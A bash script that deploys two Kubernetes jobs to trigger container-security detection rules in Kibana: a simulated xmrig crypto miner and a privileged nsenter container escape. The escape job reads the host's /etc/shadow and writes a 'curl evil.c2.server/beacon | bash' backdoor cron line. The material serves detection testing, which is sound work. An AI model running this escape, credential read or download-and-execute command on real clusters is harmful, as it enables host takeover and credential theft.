#!/bin/bash
set -e
################################################################################
# D4C2 Demo - Run both attack simulations
#
# Deploys two K8s jobs that trigger the two detection rules:
#   1. Crypto miner: downloads "xmrig" to /tmp, connects to mining pool
#   2. Container breakout: nsenter escape, host recon, credential harvesting
################################################################################

# --- Colors ---
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
PURPLE='\033[0;35m'
NC='\033[0m'

print_info()  { echo -e "${GREEN}[INFO]${NC} $1"; }
print_phase() {
    echo -e "\n${PURPLE}========================================${NC}"
    echo -e "${PURPLE} $1${NC}"
    echo -e "${PURPLE}========================================${NC}\n"
}

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"

print_phase "Reading Terraform outputs"

CONTROL_IP=$(terraform -chdir="${PROJECT_DIR}/infra" output -raw control_plane_public_ip)
KIBANA_URL=$(terraform -chdir="${PROJECT_DIR}/infra" output -raw kibana_url)
SSH_KEY="${PROJECT_DIR}/d4c2-key.pem"

print_info "Control plane: $CONTROL_IP"
print_info "Kibana: $KIBANA_URL"

################################################################################
# Attack 1: Crypto miner simulation
################################################################################

print_phase "Attack 1: Crypto Miner Simulation"

print_info "Creating crypto miner job manifest..."
cat <<'JOBEOF' > /tmp/crypto-miner-job.yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: crypto-miner-sim
  namespace: default
spec:
  ttlSecondsAfterFinished: 300
  template:
    spec:
      containers:
      - name: miner
        image: ubuntu:22.04
        command: ["/bin/bash", "-c"]
        args:
          - |
            apt-get update -qq && apt-get install -y -qq curl procps > /dev/null 2>&1
            # Simulate downloading a crypto miner binary
            cp /bin/ls /tmp/xmrig
            chmod +x /tmp/xmrig
            # Simulate mining pool DNS lookup / connection attempt
            echo "Connecting to stratum+tcp://pool.minexmr.com:4444..."
            curl -s --connect-timeout 3 http://pool.minexmr.com:4444 || true
            # Run the "miner" - the binary name and network activity should trigger D4C
            /tmp/xmrig || true
            echo "Crypto miner simulation complete"
            sleep 60
      restartPolicy: Never
  backoffLimit: 0
JOBEOF

print_info "Cleaning up previous crypto miner job..."
ssh -i "$SSH_KEY" -o StrictHostKeyChecking=no ubuntu@${CONTROL_IP} \
  "kubectl delete job crypto-miner-sim --ignore-not-found=true" 2>&1

print_info "Deploying crypto miner job to cluster..."
scp -i "$SSH_KEY" -o StrictHostKeyChecking=no \
  /tmp/crypto-miner-job.yaml ubuntu@${CONTROL_IP}:/tmp/
ssh -i "$SSH_KEY" -o StrictHostKeyChecking=no ubuntu@${CONTROL_IP} \
  "kubectl apply -f /tmp/crypto-miner-job.yaml"

print_info "Crypto miner job deployed."
print_info "  -> Triggers rule: Crypto Miner Detected (xmrig in /tmp)"

################################################################################
# Attack 2: Container breakout via nsenter
################################################################################

print_phase "Attack 2: Container Breakout via nsenter"

print_info "Creating container breakout job manifest..."
cat <<'JOBEOF' > /tmp/node-breakout-job.yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: node-breakout-sim
  namespace: default
spec:
  ttlSecondsAfterFinished: 300
  template:
    spec:
      hostPID: true
      containers:
      - name: breakout
        image: ubuntu:22.04
        command: ["/bin/bash", "-c"]
        args:
          - |
            echo "=== Stage 1: Container escape via nsenter ==="
            # Break out of the container into the host's namespaces
            # nsenter --target 1 enters PID 1's (host init) namespace
            nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash -c '
              echo "=== Stage 2: Host reconnaissance ==="
              whoami
              hostname
              uname -a
              cat /etc/os-release
              ip addr show 2>/dev/null || ifconfig 2>/dev/null

              echo "=== Stage 3: Credential harvesting ==="
              cat /etc/shadow

              echo "=== Stage 4: Persistence ==="
              echo "* * * * * root curl -s http://evil.c2.server/beacon | bash" > /tmp/.hidden-cron
              echo "Backdoor cron installed at /tmp/.hidden-cron"
            '
            echo "Container breakout simulation complete"
            sleep 60
        securityContext:
          privileged: true
      restartPolicy: Never
  backoffLimit: 0
JOBEOF

print_info "Cleaning up previous breakout job..."
ssh -i "$SSH_KEY" -o StrictHostKeyChecking=no ubuntu@${CONTROL_IP} \
  "kubectl delete job node-breakout-sim --ignore-not-found=true" 2>&1

print_info "Deploying container breakout job to cluster..."
scp -i "$SSH_KEY" -o StrictHostKeyChecking=no \
  /tmp/node-breakout-job.yaml ubuntu@${CONTROL_IP}:/tmp/
ssh -i "$SSH_KEY" -o StrictHostKeyChecking=no ubuntu@${CONTROL_IP} \
  "kubectl apply -f /tmp/node-breakout-job.yaml"

print_info "Container breakout job deployed."
print_info "  -> Triggers rule: Container Breakout via nsenter (Node-Level Escape)"
print_info "  Attack chain: nsenter escape -> host recon -> credential harvesting -> persistence"

################################################################################
# Update shared state
################################################################################

jq '.demo_executed = true' "${PROJECT_DIR}/shared/env.json" > /tmp/env-updated.json \
  && mv /tmp/env-updated.json "${PROJECT_DIR}/shared/env.json"

################################################################################
# Summary
################################################################################

print_phase "Both attacks deployed"

echo -e "Expected alerts:"
echo -e "  ${YELLOW}HIGH${NC}     Crypto Miner Detected (xmrig in /tmp)"
echo -e "  ${YELLOW}CRITICAL${NC} Container Breakout via nsenter (Node-Level Escape)"
echo ""
print_info "Alerts should appear within 1-2 minutes:"
print_info "  ${KIBANA_URL}/app/security/alerts"
